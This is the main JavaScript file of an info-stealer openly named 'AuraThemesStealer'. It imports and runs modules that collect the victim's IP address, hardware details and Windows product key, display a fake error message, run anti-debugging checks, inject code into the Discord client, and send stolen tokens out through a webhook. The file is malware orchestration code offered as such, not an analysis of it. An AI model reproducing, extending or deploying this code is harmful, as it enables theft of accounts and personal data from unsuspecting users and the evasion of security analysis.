require("dotenv").config();

const { error } = require("./utils/console/error");
const { getInfo } = require("./modules/core/core");
const { discordInjected } = require("./modules/injections/discord");
const { fakeError } = require("./modules/fakeerror/fake");
const { webhookTokens } = require("./modules/tokens/send");
const { antidebug } = require("./modules/antidebug/antidebug");

const config = require("./config/config")();

class AuraThemesStealer {
    constructor() {
        this.aurita();
    }

    async aurita() {
        try {
            const { DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION } = await getInfo();
            
            await fakeError(config.errorMessage, config);
            await antidebug(config.debugger, DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION);
            await discordInjected(config.injection);
            await webhookTokens(config.webhook)
        } catch (error) {
            console.error('An error occurred in main', error);
        }
    }
}

new AuraThemesStealer();

error();
